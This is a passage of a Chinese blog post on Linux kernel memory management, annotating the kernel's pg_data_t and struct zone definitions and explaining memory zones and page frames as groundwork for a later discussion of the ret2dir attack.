manipulate node_size_lock without checking for CONFIG_MEMORY_HOTPLUG.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Nests above zone-&gt;lock and zone-&gt;span_seqlock</span></span><br><span class="line"><span class="comment">     * 当系统支持内存热插拨时，用于保护本结构中的与节点大小相关的字段。</span></span><br><span class="line"><span class="comment">     * 哪调用node_start_pfn，node_present_pages，node_spanned_pages相关的代码时，需要使用该锁。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">spinlock_t</span> node_size_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">/* /*起始页面帧号，指出该节点在全局mem_map中的偏移</span></span><br><span class="line"><span class="comment">    系统中所有的页帧是依次编号的，每个页帧的号码都是全局唯一的（不只是结点内唯一）  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> node_start_pfn;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> node_present_pages; <span class="comment">/* total number of physical pages 结点中页帧的数目 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> node_spanned_pages; <span class="comment">/* total size of physical page range, including holes                     该结点以页帧为单位计算的长度，包含内存空洞 */</span></span><br><span class="line">    <span class="type">int</span> node_id;        <span class="comment">/*  全局结点ID，系统中的NUMA结点都从0开始编号  */</span></span><br><span class="line">    <span class="type">wait_queue_head_t</span> kswapd_wait;      <span class="comment">/*  交换守护进程的等待队列，</span></span><br><span class="line"><span class="comment">    在将页帧换出结点时会用到。后面的文章会详细讨论。    */</span></span><br><span class="line">    <span class="type">wait_queue_head_t</span> pfmemalloc_wait;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">kswapd</span>;</span>     <span class="comment">/* Protected by  mem_hotplug_begin/end() 指向负责该结点的交换守护进程的task_struct。   */</span></span><br><span class="line">    <span class="type">int</span> kswapd_max_order;                       <span class="comment">/*  定义需要释放的区域的长度  */</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">zone_type</span> <span class="title">classzone_idx</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPACTION</span></span><br><span class="line">    <span class="type">int</span> kcompactd_max_order;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">zone_type</span> <span class="title">kcompactd_classzone_idx</span>;</span></span><br><span class="line">    <span class="type">wait_queue_head_t</span> kcompactd_wait;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">kcompactd</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NUMA_BALANCING</span></span><br><span class="line">    <span class="comment">/* Lock serializing the migrate rate limiting window */</span></span><br><span class="line">    <span class="type">spinlock_t</span> numabalancing_migrate_lock;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Rate limiting time interval */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> numabalancing_migrate_next_window;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Number of pages migrated during the rate limiting time interval */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> numabalancing_migrate_nr_pages;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEFERRED_STRUCT_PAGE_INIT</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * If memory initialisation on large machines is deferred then this</span></span><br><span class="line"><span class="comment">     * is the first PFN that needs to be initialised.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> first_deferred_pfn;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_DEFERRED_STRUCT_PAGE_INIT */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_TRANSPARENT_HUGEPAGE</span></span><br><span class="line">    <span class="type">spinlock_t</span> split_queue_lock;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">split_queue</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> split_queue_len;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125; <span class="type">pg_data_t</span>;</span><br></pre></td></tr></table></figure><h2 id="什么是区？">什么是区？</h2><blockquote><p>参考自<a href="https://www.cnblogs.com/linhaostudy/p/10006723.html#_label0">https://www.cnblogs.com/linhaostudy/p/10006723.html#_label0</a><br>上面说道我们每个cpu都有一个节点内存。对于每个节点，又被划分为不同的区。一个管理区域通过struct zone_struct描述, 其被定义为zone_t, 用以表示内存的某个范围, 低端范围的16MB被描述为ZONE_DMA, 某些工业标准体系结构中的(ISA)设备需要用到它, 然后是可直接映射到内核的普通内存域ZONE_NORMAL,最后是超出了内核段的物理地址域ZONE_HIGHMEM, 被称为高端内存（64位已经不用了）.　是系统中预留的可用内存空间, 不能被内核直接映射.</p></blockquote><p>这么大费周章又是要干嘛？其实这三个区都有说法。最低16mb是为了兼容isa总线dma处理器用的（虽然我不知道这是什么），中间能直接线性映射的就直接映射，而对于现代32位x86架构只能寻址4g,很多内存没法直接映射，就又要单独讨论，这么着划分的3个区。</p><p>其实还有其他标记节点内存区的标记：比如ZONE_MOVEABLE, ZONE_DEVICE等这种伪内存区，为了热插拔等等特性所设计，这里不再展开。而现在的AMD64架构已经不再需要高端内存了，128T足够将所有物理内存线性映射到内核</p><blockquote><p>这也成为后面我们要谈的ret2dir攻击手法的开始</p></blockquote><p>最后简单谈谈32位下内核空间1g用户空间3g,超出normal区的高端内存如何访问。按这篇blog来讲，就是临时替换页表，从虚拟地址选一段出来做逻辑地址空间然后临时借用，换掉页表建立映射，用完归还。另外，intel似乎支持一种叫做PAE页表扩展的技术，可以通过扩展一级页表让系统访问更多的内存，这里也不再展开。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/* Read-mostly fields */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* zone watermarks, access with *_wmark_pages(zone) macros */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> watermark[NR_WMARK];</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> nr_reserved_highatomic;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * We don&#x27;t know if the memory that we&#x27;re going to allocate will be</span></span><br><span class="line"><span class="comment">     * freeable or/and it will be released eventually, so to avoid totally</span></span><br><span class="line"><span class="comment">     * wasting several GB of ram we must reserve some of the lower zone</span></span><br><span class="line"><span class="comment">     * memory (otherwise we risk to run OOM on the lower zones despite</span></span><br><span class="line"><span class="comment">     * there being tons of freeable ram on the higher zones).  This array is</span></span><br><span class="line"><span class="comment">     * recalculated at runtime if the sysctl_lowmem_reserve_ratio sysctl</span></span><br><span class="line"><span class="comment">     * changes.</span></span><br><span class="line"><span class="comment">     * 分别为各种内存域指定了若干页</span></span><br><span class="line"><span class="comment">     * 用于一些无论如何都不能失败的关键性内存分配。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">long</span> lowmem_reserve[MAX_NR_ZONES];</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">    <span class="type">int</span> node;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * The target ratio of ACTIVE_ANON to INACTIVE_ANON pages on</span></span><br><span class="line"><span class="comment">     * this zone&#x27;s LRU.  Maintained by the pageout code.</span></span><br><span class="line"><span class="comment">     * 不活动页的比例,</span></span><br><span class="line"><span class="comment">     * 接着是一些很少使用或者大部分情况下是只读的字段：</span></span><br><span class="line"><span class="comment">     * wait_table wait_table_hash_nr_entries wait_table_bits</span></span><br><span class="line"><span class="comment">     * 形成等待列队，可以等待某一页可供进程使用  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> inactive_ratio;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*  指向这个zone所在的pglist_data对象  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pglist_data</span>      *<span class="title">zone_pgdat</span>;</span></span><br><span class="line">    <span class="comment">/*/这个数组用于实现每个CPU的热/冷页帧列表。内核使用这些列表来保存可用于满足实现的“新鲜”页。但冷热页帧对应的高速缓存状态不同：有些页帧很可能在高速缓存中，因此可以快速访问，故称之为热的；未缓存的页帧与此相对，称之为冷的。*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_pageset</span> __<span class="title">percpu</span> *<span class="title">pageset</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This is a per-zone reserve of pages that are not available</span></span><br><span class="line"><span class="comment">     * to userspace allocations.</span></span><br><span class="line"><span class="comment">     * 每个区域保留的不能被用户空间分配的页面数目</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       totalreserve_pages;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CONFIG_SPARSEMEM</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Flags for a pageblock_nr_pages block. See pageblock-flags.h.</span></span><br><span class="line"><span class="comment">     * In SPARSEMEM, this map is stored in struct mem_section</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       *pageblock_flags;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_SPARSEMEM */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * zone reclaim becomes active if more unmapped pages exist.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       min_unmapped_pages;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       min_slab_pages;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_NUMA */</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* zone_start_pfn == zone_start_paddr &gt;&gt; PAGE_SHIFT</span></span><br><span class="line"><span class="comment">     * 只内存域的第一个页帧 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       zone_start_pfn;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * spanned_pages is the total pages spanned by the zone, including</span></span><br><span class="line"><span class="comment">     * holes, which is calculated as:</span></span><br><span class="line"><span class="comment">     *      spanned_pages = zone_end_pfn - zone_start_pfn;</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * present_pages is physical pages existing within the zone, which</span></span><br><span class="line"><span class="comment">     * is calculated as:</span></span><br><span class="line"><span class="comment">     *      present_pages = spanned_pages - absent_pages(pages in holes);</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * managed_pages is present pages managed by the buddy system, which</span></span><br><span class="line"><span class="comment">     * is calculated as (reserved_pages includes pages allocated by the</span></span><br><span class="line"><span class="comment">     * bootmem allocator):</span></span><br><span class="line"><span class="comment">     *      managed_pages = present_pages - reserved_pages;</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * So present_pages may be used by memory hotplug or memory power</span></span><br><span class="line"><span class="comment">     * management logic to figure out unmanaged pages by checking</span></span><br><span class="line"><span class="comment">     * (present_pages - managed_pages). And managed_pages should be used</span></span><br><span class="line"><span class="comment">     * by page allocator and vm scanner to calculate all kinds of watermarks</span></span><br><span class="line"><span class="comment">     * and thresholds.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Locking rules:</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * zone_start_pfn and spanned_pages are protected by span_seqlock.</span></span><br><span class="line"><span class="comment">     * It is a seqlock because it has to be read outside of zone-&gt;lock,</span></span><br><span class="line"><span class="comment">     * and it is done in the main allocator path.  But, it is written</span></span><br><span class="line"><span class="comment">     * quite infrequently.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * The span_seq lock is declared along with zone-&gt;lock because it is</span></span><br><span class="line"><span class="comment">     * frequently read in proximity to zone-&gt;lock.  It&#x27;s good to</span></span><br><span class="line"><span class="comment">     * give them a chance of being in the same cacheline.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Write access to present_pages at runtime should be protected by</span></span><br><span class="line"><span class="comment">     * mem_hotplug_begin/end(). Any reader who can&#x27;t tolerant drift of</span></span><br><span class="line"><span class="comment">     * present_pages should get_online_mems() to get a stable value.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Read access to managed_pages should be safe because it&#x27;s unsigned</span></span><br><span class="line"><span class="comment">     * long. Write access to zone-&gt;managed_pages and totalram_pages are</span></span><br><span class="line"><span class="comment">     * protected by managed_page_count_lock at runtime. Idealy only</span></span><br><span class="line"><span class="comment">     * adjust_managed_page_count() should be used instead of directly</span></span><br><span class="line"><span class="comment">     * touching zone-&gt;managed_pages and totalram_pages.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       managed_pages;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       spanned_pages;             <span class="comment">/*  总页数，包含空洞  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       present_pages;              <span class="comment">/*  可用页数，不包哈空洞  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*  指向管理区的传统名字, &quot;DMA&quot;, &quot;NROMAL&quot;或&quot;HIGHMEM&quot; */</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>          *name;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMORY_ISOLATION</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Number of isolated pageblock. It is used to solve incorrect</span></span><br><span class="line"><span class="comment">     * freepage counting problem due to racy retrieving migratetype</span></span><br><span class="line"><span class="comment">     * of pageblock. Protected by zone-&gt;lock.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       nr_isolate_pageblock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMORY_HOTPLUG</span></span><br><span class="line">    <span class="comment">/* see spanned/present_pages for more description */</span></span><br><span class="line">    <span class="type">seqlock_t</span>           span_seqlock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * wait_table       -- the array holding the hash table</span></span><br><span class="line"><span class="comment">     * wait_table_hash_nr_entries   -- the size of the hash table array</span></span><br><span class="line"><span class="comment">     * wait_table_bits      -- wait_table_size == (1 &lt;&lt; wait_table_bits)</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * The purpose of all these is to keep track of the people</span></span><br><span class="line"><span class="comment">     * waiting for a page to become available and make them</span></span><br><span class="line"><span class="comment">     * runnable again when possible. The trouble is that this</span></span><br><span class="line"><span class="comment">     * consumes a lot of space, especially when so few things</span></span><br><span class="line"><span class="comment">     * wait on pages at a given time. So instead of using</span></span><br><span class="line"><span class="comment">     * per-page waitqueues, we use a waitqueue hash table.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * The bucket discipline is to sleep on the same queue when</span></span><br><span class="line"><span class="comment">     * colliding and wake all in that wait queue when removing.</span></span><br><span class="line"><span class="comment">     * When something wakes, it must check to be sure its page is</span></span><br><span class="line"><span class="comment">     * truly available, a la thundering herd. The cost of a</span></span><br><span class="line"><span class="comment">     * collision is great, but given the expected load of the</span></span><br><span class="line"><span class="comment">     * table, they should be so rare as to be outweighed by the</span></span><br><span class="line"><span class="comment">     * benefits from the saved space.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * __wait_on_page_locked() and unlock_page() in mm/filemap.c, are the</span></span><br><span class="line"><span class="comment">     * primary users of these fields, and in mm/page_alloc.c</span></span><br><span class="line"><span class="comment">     * free_area_init_core() performs the initialization of them.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">/*  进程等待队列的散列表, 这些进程正在等待管理区中的某页  */</span></span><br><span class="line">    <span class="type">wait_queue_head_t</span>       *wait_table;</span><br><span class="line">    <span class="comment">/*  等待队列散列表中的调度实体数目  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       wait_table_hash_nr_entries;</span><br><span class="line">    <span class="comment">/*  等待队列散列表数组大小, 值为2^order  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       wait_table_bits;</span><br><span class="line"></span><br><span class="line">    ZONE_PADDING(_pad1_)</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* free areas of different sizes</span></span><br><span class="line"><span class="comment">       页面使用状态的信息，以每个bit标识对应的page是否可以分配</span></span><br><span class="line"><span class="comment">       是用于伙伴系统的，每个数组元素指向对应阶也表的数组开头</span></span><br><span class="line"><span class="comment">       以下是供页帧回收扫描器(page reclaim scanner)访问的字段</span></span><br><span class="line"><span class="comment">       scanner会跟据页帧的活动情况对内存域中使用的页进行编目</span></span><br><span class="line"><span class="comment">       如果页帧被频繁访问，则是活动的，相反则是不活动的，</span></span><br><span class="line"><span class="comment">       在需要换出页帧时，这样的信息是很重要的：   */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">free_area</span>    <span class="title">free_area</span>[<span class="title">MAX_ORDER</span>];</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* zone flags, see below 描述当前内存的状态, 参见下面的enum zone_flags结构 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       flags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Write-intensive fields used from the page allocator, 保存该描述符的自旋锁  */</span></span><br><span class="line">    <span class="type">spinlock_t</span>          lock;</span><br><span class="line"></span><br><span class="line">    ZONE_PADDING(_pad2_)</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Write-intensive fields used by page reclaim */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Fields commonly accessed by the page reclaim scanner */</span></span><br><span class="line">    <span class="type">spinlock_t</span>          lru_lock;   <span class="comment">/* LRU(最近最少使用算法)活动以及非活动链表使用的自旋锁  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">lruvec</span>       <span class="title">lruvec</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * When free pages are below this point, additional steps are taken</span></span><br><span class="line"><span class="comment">     * when reading the number of free pages to avoid per-cpu counter</span></span><br><span class="line"><span class="comment">     * drift allowing watermarks to be breached</span></span><br><span class="line"><span class="comment">     * 在空闲页的数目少于这个点percpu_drift_mark的时候</span></span><br><span class="line"><span class="comment">     * 当读取和空闲页数一样的内存页时，系统会采取额外的工作，</span></span><br><span class="line"><span class="comment">     * 防止单CPU页数漂移，从而导致水印被破坏。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> percpu_drift_mark;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined CONFIG_COMPACTION || defined CONFIG_CMA</span></span><br><span class="line">    <span class="comment">/* pfn where compaction free scanner should start */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       compact_cached_free_pfn;</span><br><span class="line">    <span class="comment">/* pfn where async and sync compaction migration scanner should start */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       compact_cached_migrate_pfn[<span class="number">2</span>];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPACTION</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * On compaction failure, 1&lt;&lt;compact_defer_shift compactions</span></span><br><span class="line"><span class="comment">     * are skipped before trying again. The number attempted since</span></span><br><span class="line"><span class="comment">     * last failure is tracked with compact_considered.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        compact_considered;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        compact_defer_shift;</span><br><span class="line">    <span class="type">int</span>                       compact_order_failed;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined CONFIG_COMPACTION || defined CONFIG_CMA</span></span><br><span class="line">    <span class="comment">/* Set to true when the PG_migrate_skip bits should be cleared */</span></span><br><span class="line">    <span class="type">bool</span>            compact_blockskip_flush;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="type">bool</span>            contiguous;</span><br><span class="line"></span><br><span class="line">    ZONE_PADDING(_pad3_)</span><br><span class="line">    <span class="comment">/* Zone statistics 内存域的统计信息, 参见后面的enum zone_stat_item结构 */</span></span><br><span class="line">    <span class="type">atomic_long_t</span>       vm_stat[NR_VM_ZONE_STAT_ITEMS];</span><br><span class="line">&#125; ____cacheline_internodealigned_in_smp;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>剩下的内容太复杂了，不再赘述。总结参看下方链接即可。总的来讲，“区”只是一种逻辑上的分组，方便操作系统按一定的结构和顺序去管理页的分配。并不是一种物理上的强制措施。</p><blockquote><p>参考<a href="https://www.cnblogs.com/linhaostudy/p/10006723.html#autoid-6-4-0">https://www.cnblogs.com/linhaostudy/p/10006723.html#autoid-6-4-0</a></p></blockquote><h2 id="什么是页框？">什么是页框？</h2><blockquote><p><a href="https://blog.csdn.net/gatieme/article/details/52384636">https://blog.csdn.net/gatieme/article/details/52384636</a><br>这应该是一个大佬一系列的文章</p></blockquote><p>终于到了我们熟悉的内容，区下面管理的就是一个个页框了。linux也用一个结构体管理物理page frame叫做<code>struct page</code>。考虑到大量的page数量，page结构要尽量的小，因此这个结构里使用了大量的联合体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span 